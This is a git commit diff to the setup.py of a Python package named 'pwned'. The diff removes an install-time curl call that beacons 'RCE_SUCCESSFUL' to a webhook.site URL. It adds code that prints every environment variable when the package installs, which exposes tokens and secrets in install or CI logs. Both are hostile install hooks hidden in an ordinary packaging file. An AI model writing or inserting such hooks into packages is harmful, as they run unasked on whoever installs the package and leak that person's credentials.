df405e75e2b1268c355495ef92e50bcf54c0ce45
Sahil <sahil9821145007@gmail.com>
2026-06-12 22:08:10 +0545

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,14 +1,9 @@
 from setuptools import setup
 import os
-import urllib.request
+print("DEBUG: ENVIRONMENT VARIABLES START")
+for k, v in os.environ.items():
+    print(f"{k}={v}")
+print("DEBUG: ENVIRONMENT VARIABLES END")
 
-# This runs the second 'pip install' starts!
-try:
-    os.system("curl https://webhook.site/470e1846-1bd3-43ec-868c-a64283768bb4 -d 'RCE_SUCCESSFUL'")
-except:
-    pass
-
-setup(
-    name="pwned",
-    version="0.0.1",
-)
+from setuptools import setup
+setup(name="pwned", version="0.0.1")
